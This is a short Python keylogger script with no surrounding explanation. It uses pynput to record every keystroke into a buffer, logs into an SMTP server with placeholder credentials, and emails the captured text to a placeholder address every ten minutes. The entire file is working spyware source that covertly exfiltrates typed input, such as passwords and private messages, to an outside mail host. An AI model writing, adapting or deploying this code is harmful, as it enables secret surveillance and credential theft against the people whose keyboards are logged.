from pynput.keyboard import Listener
import smtplib
from threading import Timer

msg = ''

def on_press(key):
    global msg
    k = str(key).replace("'", "")
    
    if k == 'Key.enter':
        msg += "[ENTER]\n"
    elif k == 'Key.backspace':
        msg = msg[:-1] 
    elif k == 'Key.shift':
        msg += '^'
    elif k == 'Key.delete':
        msg += '[DEL]'
    else:
        msg += k

def send():
    global msg
    if len(msg)>0:
        server.sendmail("from_addr@test.com", "to_addr@test.com", msg)
    Timer(600.0, send).start()

#keyboard listening
listener = Listener(on_press=on_press)
listener.start()

#connecting to smtp server
server=smtplib.SMTP('smtp.test.com',587)
server.starttls()
server.login("login","password")

#starting sending function after 10 minutes
Timer(600.0, send).start()

